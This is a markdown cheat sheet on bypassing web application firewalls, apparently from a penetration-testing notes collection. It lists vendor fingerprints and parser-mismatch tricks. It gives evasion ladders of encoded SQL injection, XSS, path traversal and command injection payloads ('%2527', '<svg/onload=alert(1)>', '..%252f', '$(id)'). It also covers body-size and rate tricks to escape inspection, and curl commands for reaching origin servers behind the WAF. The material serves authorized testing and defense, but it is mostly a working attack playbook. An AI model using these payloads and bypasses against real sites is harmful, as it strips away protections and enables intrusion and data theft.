# WAF Bypass

A WAF is a regex engine with a budget. It is beaten by giving it more parse work than it
can afford, or by giving it a different parse than the backend.

---

## 1. Identify the WAF before fighting it

| Signal | Vendor |
|---|---|
| `Server: cloudflare`, `cf-ray` | Cloudflare |
| `x-akamai-*`, `akamai-grn` | Akamai |
| `x-amzn-requestid` + 403 HTML | AWS WAF |
| `x-sucuri-id` | Sucuri |
| `Server: BigIP`, `TS*` cookie | F5 |
| `x-iinfo`, `visid_incap` | Imperva |
| `Server: awselb` + 403 | ALB rule |

Then: `wafw00f`, or just send `'` and read the block page. The block page names the rule
(`Cloudflare: SQL injection`), which tells you which parser you are fighting.

---

## 2. Give the WAF a different parse than the backend

This is the whole game. Anywhere the WAF and the app disagree, the payload passes.

| Disagreement | Payload shape |
|---|---|
| WAF decodes once, app twice | `%2527` → app sees `'` |
| WAF sees query, app reads body | put the payload in a JSON body |
| WAF sees body, app reads query | `?q=<payload>` with a benign body |
| WAF sees `Content-Type: json`, app parses form | lie about `Content-Type` |
| WAF ignores multipart parts | split the payload across parts |
| WAF ignores headers | `X-Forwarded-*`, custom headers the app reads |
| WAF ignores chunk extensions | `Transfer-Encoding: chunked` with junk extensions |
| WAF ignores duplicate keys | `id=1&id=<payload>` (app takes the last) |
| WAF normalizes case, app does not | `SeLeCt` |
| WAF strips comments, app does not | `SEL/**/ECT` |

---

## 3. Payload-level evasion

**SQL**
```
' OR 1=1--      → %27%20OR%201%3D1--
UNION SELECT    → UN/**/ION SE/**/LECT
' or 'a'='a     → %27%20or%20%27a%27%3D%27a
0x3c3f...       → hex literal instead of string
CHAR(39)        → built quote
```

**XSS**
```
<script>alert(1)</script> → <svg/onload=alert(1)>
<img src=x onerror=alert(1)> → <img src=x onerror=alert`1`>
alert(1) → top['alert'](1) → [].constructor.constructor('alert(1)')()
```

**Traversal**
```
../  → ..%2f → ..%252f → ....// → ..%c0%af → ..;/ → ..%5c
```

**Command injection**
```
; id → %3Bid → `id` → $(id) → |id → %0aid → ;i\d
```

---

## 4. Size and rate tricks

- **Oversize body**: pad to >128 KB so the WAF truncates inspection before the payload.
- **Deep JSON**: nest 200 levels; some WAFs stop at 10.
- **Many params**: 500 params; some WAFs inspect only the first 100.
- **Slow drip**: send the body over 30 s so the inspection window expires.
- **Chunked with extensions**: `5;x=y\r\nHELLO\r\n`.
- **Huge header count**: push the interesting header past the inspection limit.

---

## 5. Origin bypass (the cleanest win)

If you can reach the origin directly, the WAF is gone.

```bash
# resolve origin candidates from DNS history, CT, and mail records
dig +short MX example.com
curl -s "https://api.hackertarget.com/hostsearch/?q=example.com"
# then
curl -i https://<origin-ip>/admin -H 'Host: example.com' -k
```

Also: alt ports (8080/8443/9000), IPv6 literals, `--resolve`, and the staging host that
shares the origin but not the WAF.

---

## 6. When the WAF is not the problem

If the block page is a framework 403, the WAF ladder is wasted. Check the body: framework
403s say `Whitelabel Error`, `Forbidden`, `CSRF verification failed`. App blocks need
`403-401-bypass.md`.

---

## Go deeper

1. Read the block page's rule ID; search it — vendors document the exact regex.
2. Test whether the WAF decodes twice by sending `%2527` and reading the app's error.
3. Try the same payload in a header the app logs but the WAF ignores.
4. Check whether the WAF protects the API host at all (`api.` vs `www.`).
5. Test with HTTP/1.0 and with `Content-Type: text/plain` — both change inspection.

---

## Related

- `02-web/401-to-200.md`
- `11-regex/20-bypass.md`
- `00-core/impact-proof.md`
